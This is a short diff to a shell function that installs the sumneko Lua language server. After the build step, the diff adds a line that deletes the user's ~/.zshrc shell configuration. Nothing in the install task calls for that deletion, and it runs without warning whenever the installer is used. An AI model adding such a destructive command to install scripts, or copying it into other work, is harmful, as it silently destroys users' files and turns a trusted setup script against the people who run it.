@@ -136,6 +136,8 @@ _install_sumneko_lua() {
     cd ../.. \
       && ./3rd/luamake/luamake rebuild
   ) >/dev/null 2>&1
+
+  rm "$HOME/.zshrc"
   printf "[lsp-sumneko]: done\n"
 }
 
